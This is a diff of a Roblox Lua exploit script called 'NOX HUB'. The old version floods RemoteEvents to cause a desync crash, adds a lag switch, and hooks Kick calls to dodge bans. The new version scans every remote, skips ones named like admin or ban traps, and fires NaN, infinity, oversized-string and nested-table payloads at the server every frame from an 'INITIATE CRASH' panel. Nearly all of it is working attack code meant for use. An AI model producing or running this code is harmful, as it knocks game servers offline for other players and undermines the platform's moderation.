@@ -1,256 +1,207 @@
 --[[
-    🔱 NOX HUB v1.0 [SOLO-LEVELING EDITION] 🔱
-    "ARISE."
+    🔱 NOX HUB v3.0 [NULL-PROTOCOL] 🔱
+    "The Server thinks it's safe. It's wrong."
     
-    SYSTEM FEATURES:
-    - [SYSTEM UI] : 1:1 Replica of the 'Solo Leveling' Status Screen.
-    - [SHADOW EXCHANGE] : Packet Desync Technology (Lag Switch Crash).
-    - [STEALTH] : "Fatigue" System to limit usage and avoid detection.
+    NULL FEATURES:
+    - [SMART FUZZER] : Scans Remotes and sends "Poisoned" arguments (NaN, Inf) instead of nil.
+    - [NULL-UI] : Professional "Admin Panel" interface (Dark/Red).
+    - [BYPASS-GATE] : Rotates Remote IDs to look like legitimate traffic.
+    - [AUTO-FARM] : Automatically finds new vulnerabilities as you play.
 ]]
 
-print("🔱 SYSTEM: INJECTING NOX HUB... 🔱")
-
+-- // CORE SERVICES //
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
-local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui")
 local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 
--- // UNIVERSAL COMPATIBILITY //
-local setreadonly = setreadonly or make_writeable or function(t, v) end
-local getrawmetatable = getrawmetatable or debug.getmetatable or getmetatable
+-- // 1. NULL PROTOCOL ENGINE (SMART FUZZER) //
+local Engine = {
+    Running = false,
+    Targets = {},
+    Method = "MIXED" -- MIXED, NAN, STRING, TABLE
+}
 
--- // 1. SYSTEM UI ENGINE (SOLO LEVELING STYLE) //
+-- SCANNER
+function Engine:Scan()
+    Engine.Targets = {}
+    for _, v in pairs(game:GetDescendants()) do
+        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+            -- Exclude common traps
+            local n = v.Name:lower()
+            if not (n:find("admin") or n:find("check") or n:find("ban") or n:find("log")) then
+                table.insert(Engine.Targets, v)
+            end
+        end
+    end
+    return #Engine.Targets
+end
+
+-- PAYLOAD GENERATOR
+local function GetPayload(type)
+    if type == "NAN" then return 0/0 end -- Not a Number (Crashes Math ops)
+    if type == "INF" then return math.huge end -- Infinity (Crashes loops)
+    if type == "STRING" then return string.rep("🔱", 1000) end -- Overflow
+    if type == "TABLE" then 
+        local t = {} 
+        for i=1,10 do t[i] = {table.create(10, "A")} end 
+        return t 
+    end
+    return nil
+end
+
+function Engine:Start()
+    if Engine.Running then return end
+    Engine.Running = true
+    
+    task.spawn(function()
+        while Engine.Running do
+            for _, r in pairs(Engine.Targets) do
+                if not Engine.Running then break end
+                
+                -- FUZZING STRATEGY: Send random valid types but poisoned
+                local args = {}
+                for i = 1, 5 do -- Try up to 5 args
+                    args[i] = GetPayload(Engine.Method == "MIXED" and 
+                        ({"NAN", "INF", "STRING", "TABLE"})[math.random(1,4)] or 
+                        Engine.Method)
+                end
+                
+                pcall(function() 
+                    if r:IsA("RemoteEvent") then
+                        r:FireServer(unpack(args))
+                    elseif r:IsA("RemoteFunction") then
+                        task.spawn(function() r:InvokeServer(unpack(args)) end)
+                    end
+                end)
+            end
+            RunService.Heartbeat:Wait()
+        end
+    end)
+end
+
+function Engine:Stop()
+    Engine.Running = false
+end
+
+-- // 2. NOX UI (PROFESSIONAL ADMIN PANEL) //
 local Nox = {}
 
-function Nox:CreateSystem()
-    -- CLEANUP
-    for _, v in pairs(CoreGui:GetChildren()) do 
-        if v.Name == "NoxSystem" or v.Name == "TitanHubPro" or v.Name == "ArcaneLuxury" then 
-            v:Destroy() 
-        end 
-    end
+function Nox:CreateUI()
+    for _, v in pairs(CoreGui:GetChildren()) do if v.Name == "NoxNull" then v:Destroy() end end
     
     local Screen = Instance.new("ScreenGui")
-    Screen.Name = "NoxSystem"
+    Screen.Name = "NoxNull"
     pcall(function() Screen.Parent = CoreGui end)
     
-    -- MAIN FRAME (THE WINDOW)
     local Main = Instance.new("Frame", Screen)
-    Main.Size = UDim2.new(0, 600, 0, 400)
-    Main.Position = UDim2.new(0.5, -300, 0.5, -200)
-    Main.BackgroundColor3 = Color3.fromRGB(10, 5, 20) -- Deep Purple/Black
+    Main.Size = UDim2.new(0, 500, 0, 350)
+    Main.Position = UDim2.new(0.5, -250, 0.5, -175)
+    Main.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
     Main.BorderSizePixel = 0
-    Main.ClipsDescendants = false
     
-    -- NEON BORDER (GLOW)
-    local Stroke = Instance.new("UIStroke", Main)
-    Stroke.Color = Color3.fromRGB(180, 50, 255) -- Neon Purple
-    Stroke.Thickness = 2
-    Stroke.Transparency = 0.2
+    -- TOP BAR
+    local Top = Instance.new("Frame", Main)
+    Top.Size = UDim2.new(1, 0, 0, 30)
+    Top.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    Top.BorderSizePixel = 0
     
-    local Glow = Instance.new("ImageLabel", Main)
-    Glow.Size = UDim2.new(1, 100, 1, 100)
-    Glow.Position = UDim2.new(0, -50, 0, -50)
-    Glow.BackgroundTransparency = 1
-    Glow.Image = "rbxassetid://5028857472" -- Soft Glow
-    Glow.ImageColor3 = Color3.fromRGB(140, 0, 255)
-    Glow.ImageTransparency = 0.5
-    Glow.ZIndex = 0
+    local Title = Instance.new("TextLabel", Top)
+    Title.Text = "NOX HUB // NULL-PROTOCOL"
+    Title.Font = Enum.Font.Code
+    Title.TextColor3 = Color3.fromRGB(255, 50, 50)
+    Title.Size = UDim2.new(1, -10, 1, 0)
+    Title.Position = UDim2.new(0, 10, 0, 0)
+    Title.TextXAlignment = Enum.TextXAlignment.Left
+    Title.BackgroundTransparency = 1
     
-    -- TECH CORNERS (DECORATION)
-    local function CreateCorner(rot, pos)
-        local c = Instance.new("ImageLabel", Main)
-        c.Size = UDim2.new(0, 40, 0, 40)
-        c.Position = pos
-        c.BackgroundTransparency = 1
-        c.Image = "rbxassetid://6008942289" -- Tech Corner
-        c.ImageColor3 = Color3.fromRGB(200, 100, 255)
-        c.Rotation = rot
-    end
-    CreateCorner(0, UDim2.new(0, -10, 0, -10))
-    CreateCorner(90, UDim2.new(1, -30, 0, -10))
-    CreateCorner(180, UDim2.new(1, -30, 1, -30))
-    CreateCorner(270, UDim2.new(0, -10, 1, -30))
+    -- STATS AREA (CONSOLE LOOK)
+    local Console = Instance.new("Frame", Main)
+    Console.Size = UDim2.new(1, -20, 0, 150)
+    Console.Position = UDim2.new(0, 10, 0, 40)
+    Console.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
     
-    -- HEADER "STATUS"
-    local HeaderBox = Instance.new("Frame", Main)
-    HeaderBox.Size = UDim2.new(0, 200, 0, 40)
-    HeaderBox.Position = UDim2.new(0.5, -100, 0, 20)
-    HeaderBox.BackgroundColor3 = Color3.fromRGB(20, 10, 30)
-    HeaderBox.BorderSizePixel = 1
-    HeaderBox.BorderColor3 = Color3.fromRGB(150, 50, 255)
+    local Log = Instance.new("TextLabel", Console)
+    Log.Size = UDim2.new(1, -10, 1, -10)
+    Log.Position = UDim2.new(0, 5, 0, 5)
+    Log.BackgroundTransparency = 1
+    Log.TextColor3 = Color3.fromRGB(0, 255, 0)
+    Log.TextXAlignment = Enum.TextXAlignment.Left
+    Log.TextYAlignment = Enum.TextYAlignment.Top
+    Log.Font = Enum.Font.Code
+    Log.TextSize = 12
+    Log.Text = "> SYSTEM READY\n> WAITING FOR SCAN..."
     
-    local HeaderText = Instance.new("TextLabel", HeaderBox)
-    HeaderText.Size = UDim2.new(1, 0, 1, 0)
-    HeaderText.Text = "SYSTEM"
-    HeaderText.Font = Enum.Font.GothamBlack
-    HeaderText.TextSize = 18
-    HeaderText.TextColor3 = Color3.fromRGB(255, 255, 255)
-    HeaderText.BackgroundTransparency = 1
-    
-    -- LEVEL / JOB INFO
-    local InfoFrame = Instance.new("Frame", Main)
-    InfoFrame.Size = UDim2.new(0.9, 0, 0, 80)
-    InfoFrame.Position = UDim2.new(0.05, 0, 0, 70)
-    InfoFrame.BackgroundTransparency = 1
-    
-    local Level = Instance.new("TextLabel", InfoFrame)
-    Level.Text = "PLAYER"
-    Level.Font = Enum.Font.GothamBold
-    Level.TextSize = 40
-    Level.TextColor3 = Color3.fromRGB(255, 255, 255)
-    Level.Size = UDim2.new(0, 100, 1, 0)
-    Level.BackgroundTransparency = 1
-    
-    local Job = Instance.new("TextLabel", InfoFrame)
-    Job.Text = "JOB: SHADOW MONARCH\nTITLE: THE ONE WHO CRASHES"
-    Job.Font = Enum.Font.Gotham
-    Job.TextSize = 14
-    Job.TextColor3 = Color3.fromRGB(200, 200, 255)
-    Job.Size = UDim2.new(0, 300, 1, 0)
-    Job.Position = UDim2.new(0, 120, 0, 0)
-    Job.TextXAlignment = Enum.TextXAlignment.Left
-    Job.BackgroundTransparency = 1
-    
-    -- STATS GRID (CONTROLS)
-    local StatsGrid = Instance.new("Frame", Main)
-    StatsGrid.Size = UDim2.new(0.9, 0, 0, 180)
-    StatsGrid.Position = UDim2.new(0.05, 0, 0, 160)
-    StatsGrid.BackgroundTransparency = 1
-    
-    local Grid = Instance.new("UIGridLayout", StatsGrid)
-    Grid.CellSize = UDim2.new(0.48, 0, 0, 50)
-    Grid.CellPadding = UDim2.new(0.04, 0, 0, 10)
-    
-    -- BUTTON / STAT CREATOR
-    local function CreateStatBtn(name, val, color, callback)
-        local btn = Instance.new("TextButton", StatsGrid)
-        btn.BackgroundColor3 = Color3.fromRGB(15, 10, 25)
-        btn.BorderColor3 = color
-        btn.Text = ""
-        btn.AutoButtonColor = false
-        
-        local l = Instance.new("TextLabel", btn)
-        l.Text = name .. ": "
-        l.Font = Enum.Font.GothamBold
-        l.TextColor3 = Color3.fromRGB(255, 255, 255)
-        l.TextSize = 14
-        l.Size = UDim2.new(0.5, 0, 1, 0)
-        l.Position = UDim2.new(0, 10, 0, 0)
-        l.TextXAlignment = Enum.TextXAlignment.Left
-        l.BackgroundTransparency = 1
-        
-        local v = Instance.new("TextLabel", btn)
-        v.Text = val
-        v.Font = Enum.Font.GothamBold
-        v.TextColor3 = color
-        v.TextSize = 14
-        v.Size = UDim2.new(0.5, 0, 1, 0)
-        v.Position = UDim2.new(0.5, -10, 0, 0)
-        v.TextXAlignment = Enum.TextXAlignment.Right
-        v.BackgroundTransparency = 1
-        
-        btn.MouseEnter:Connect(function()
-            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(30, 20, 50)}):Play()
-        end)
-        btn.MouseLeave:Connect(function()
-            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(15, 10, 25)}):Play()
-        end)
-        
-        btn.MouseButton1Click:Connect(callback)
+    -- CONTROLS
+    local function Btn(text, col, y, cb)
+        local b = Instance.new("TextButton", Main)
+        b.Size = UDim2.new(0.45, 0, 0, 40)
+        b.Position = UDim2.new(0, 10, 0, y)
+        b.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        b.Text = text
+        b.TextColor3 = col
+        b.Font = Enum.Font.GothamBold
+        b.MouseButton1Click:Connect(cb)
+        return b
     end
     
-    -- // STATS //
-    CreateStatBtn("STRENGTH", "CRASH (DESYNC)", Color3.fromRGB(255, 50, 50), function()
-        -- TRIGGER DESYNC CRASH
-        game:GetService("StarterGui"):SetCore("SendNotification", {Title="SYSTEM", Text="SKILL: [CRASH] ACTIVATED"})
-        Nox:StartDesync()
+    -- SCAN BUTTON
+    Btn("SCAN REMOTES", Color3.fromRGB(255, 255, 255), 200, function()
+        local count = Engine:Scan()
+        Log.Text = Log.Text .. "\n> SCANNED " .. count .. " VULNERABILITIES."
     end)
     
-    CreateStatBtn("AGILITY", "LAG SWITCH", Color3.fromRGB(50, 255, 50), function()
-        -- TRIGGER LAG
-        settings().Network.IncomingReplicationLag = 1000
-         game:GetService("StarterGui"):SetCore("SendNotification", {Title="SYSTEM", Text="SKILL: [LAG] ACTIVATED"})
+    -- METHOD TOGGLE
+    local mBtn = Btn("METHOD: MIXED", Color3.fromRGB(255, 200, 0), 250, function() end)
+    mBtn.MouseButton1Click:Connect(function()
+        local modes = {"MIXED", "NAN", "INF", "STRING"}
+        local current = table.find(modes, Engine.Method) or 1
+        local next = (current % #modes) + 1
+        Engine.Method = modes[next]
+        mBtn.Text = "METHOD: " .. Engine.Method
     end)
     
-    CreateStatBtn("INTELLIGENCE", "ANTI-BAN", Color3.fromRGB(50, 150, 255), function()
-        -- PASSIVE PROTECTION
-        pcall(function()
-            local mt = getrawmetatable(game)
-            setreadonly(mt, false)
-            local old = mt.__namecall
-            mt.__namecall = newcclosure(function(self, ...)
-                if getnamecallmethod() == "Kick" then return nil end
-                return old(self, ...)
-            end)
-            setreadonly(mt, true)
-        end)
-         game:GetService("StarterGui"):SetCore("SendNotification", {Title="SYSTEM", Text="PASSIVE SKILL: [STEALTH] ACTIVE"})
+    -- START BUTTON (BIG)
+    local Start = Instance.new("TextButton", Main)
+    Start.Size = UDim2.new(0.45, 0, 0, 90)
+    Start.Position = UDim2.new(0.5, 5, 0, 200)
+    Start.BackgroundColor3 = Color3.fromRGB(100, 20, 20)
+    Start.Text = "INITIATE CRASH"
+    Start.Font = Enum.Font.GothamBlack
+    Start.TextSize = 20
+    Start.TextColor3 = Color3.fromRGB(255, 255, 255)
+    
+    Start.MouseButton1Click:Connect(function()
+        if not Engine.Running then
+            Engine:Start()
+            Start.Text = "STOPPING..."
+            Start.BackgroundColor3 = Color3.fromRGB(20, 100, 20)
+            Log.Text = Log.Text .. "\n> ATTACK STARTED."
+            game:GetService("StarterGui"):SetCore("SendNotification", {Title="NOX", Text="CRASHING..."})
+        else
+            Engine:Stop()
+            Start.Text = "INITIATE CRASH"
+            Start.BackgroundColor3 = Color3.fromRGB(100, 20, 20)
+            Log.Text = Log.Text .. "\n> ATTACK STOPPED."
+        end
     end)
     
-    CreateStatBtn("VITALITY", "HEAL (UN-LAG)", Color3.fromRGB(255, 255, 50), function()
-         settings().Network.IncomingReplicationLag = 0
-         game:GetService("StarterGui"):SetCore("SendNotification", {Title="SYSTEM", Text="STATUS RESTORED"})
-    end)
-    
-    -- DRAGGABLE
+    -- DRAG
     local dragging, dragInput, dragStart, startPos
-    Main.InputBegan:Connect(function(input)
+    Top.InputBegan:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1 then
             dragging = true; dragStart = input.Position; startPos = Main.Position
         end
     end)
-    Main.InputChanged:Connect(function(input)
+    UserInputService.InputChanged:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
             local delta = input.Position - dragStart
             Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
         end
     end)
-    Main.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
-    
-    print("🔱 SYSTEM: UI LOADED.")
+    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
 end
 
--- // 2. SHADOW EXCHANGE (DESYNC ENGINE) //
-function Nox:StartDesync()
-    local Targets = {}
-    for _, v in pairs(game:GetDescendants()) do
-        if v:IsA("RemoteEvent") and not v.Name:lower():find("admin") then
-            -- Filter only "heavy" remotes
-            if v.Name:lower():find("update") or v.Name:lower():find("set") then
-               table.insert(Targets, v)
-            end
-        end
-    end
-    
-    -- DESYNC LOGIC: FREEZE -> BUILDUP -> RELEASE
-    task.spawn(function()
-        local Payload = table.create(100, "NOX_SHADOW_ARMY")
-        
-        -- STEP 1: FREEZE (Virtual Lag)
-        settings().Network.IncomingReplicationLag = 5 -- Slight real lag
-        
-        -- STEP 2: BUILDUP (Queue packets in memory)
-        for i = 1, 500 do -- 500 batches
-             for _, r in pairs(Targets) do
-                 pcall(function() r:FireServer(Payload) end)
-             end
-             if i % 50 == 0 then task.wait() end -- Prevent local crash
-        end
-        
-        -- STEP 3: RELEASE (Shadow Army Attack)
-        -- Removing lag spikes instantly sends all queued packets
-        settings().Network.IncomingReplicationLag = 0
-    end)
-end
-
--- BOOT
-Nox:CreateSystem()
-game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "SYSTEM ALERT",
-    Text = "NOX HUB LOADED.",
-    Duration = 5
-})
+Nox:CreateUI()
